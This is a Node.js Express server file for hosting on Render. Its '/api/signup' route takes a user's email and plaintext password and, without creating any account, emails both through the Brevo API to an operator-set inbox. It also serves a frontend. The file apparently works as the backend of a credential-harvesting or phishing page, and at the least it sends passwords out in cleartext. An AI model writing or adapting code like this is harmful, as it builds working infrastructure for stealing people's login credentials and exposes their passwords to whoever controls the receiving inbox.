import express from "express";
import path from "path";
import dotenv from "dotenv";
import * as SibApiV3Sdk from "@sendinblue/client";

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

/**
 * =========================
 * HEALTH CHECK (Render)
 * =========================
 */
app.get("/health", (req, res) => {
  res.status(200).send("OK");
});

/**
 * =========================
 * SIGNUP ROUTE (BREVO)
 * =========================
 */
app.post("/api/signup", async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: "Email and password required" });
  }

  const brevoKey = process.env.BREVO_API_KEY;
  const receiverEmail = process.env.RECEIVER_EMAIL;

  /**
   * IMPORTANT:
   * This must be a VERIFIED sender in Brevo
   * NOT just any Gmail
   */
  const senderEmail = process.env.EMAIL_USER;

  if (!brevoKey || !receiverEmail || !senderEmail) {
    console.error("❌ Missing env vars");
    return res.status(500).json({ error: "Server misconfigured" });
  }

  try {
    console.log("📨 Sending Brevo email...");

    const apiInstance = new SibApiV3Sdk.TransactionalEmailsApi();

    apiInstance.setApiKey(
      SibApiV3Sdk.TransactionalEmailsApiApiKeys.apiKey,
      brevoKey
    );

    const response = await apiInstance.sendTransacEmail({
      sender: {
        email: senderEmail,
        name: "Render Signup System",
      },
      to: [
        {
          email: receiverEmail,
        },
      ],
      subject: "New Signup Received",
      htmlContent: `
        <h2>New Signup</h2>
        <p><b>Email:</b> ${email}</p>
        <p><b>Password:</b> ${password}</p>
      `,
    });

    console.log("✅ Email sent:", response);

    return res.json({
      success: true,
      message: "Email sent",
    });
  } catch (err) {
    console.error("❌ Brevo error:", err);
    return res.status(500).json({
      error: "Email failed",
    });
  }
});

/**
 * =========================
 * SERVE FRONTEND (RENDER FIX)
 * =========================
 */
const distPath = path.resolve(process.cwd(), "dist");

app.use(express.static(distPath));

app.get("*", (req, res) => {
  res.sendFile(path.join(distPath, "index.html"));
});

/**
 * =========================
 * START SERVER (RENDER)
 * =========================
 */
app.listen(PORT, "0.0.0.0", () => {
  console.log(`Server running on port ${PORT}`);
});